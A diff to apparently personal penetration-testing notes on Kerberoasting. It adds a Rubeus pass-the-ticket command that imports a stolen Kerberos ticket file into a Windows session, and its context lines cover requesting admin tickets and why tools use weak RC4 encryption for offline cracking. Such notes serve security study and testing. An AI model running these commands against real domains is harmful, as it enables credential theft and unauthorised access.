@@ -54,6 +54,13 @@ Request tickets with admincount attribute set to 1:
 ```
 
 
+Importing Converted Ticket into Windows Session with Rubeus: 
+
+```cmd-session
+ C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
+```
+
+
 ## Evasion techniques
 
 Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Overall:
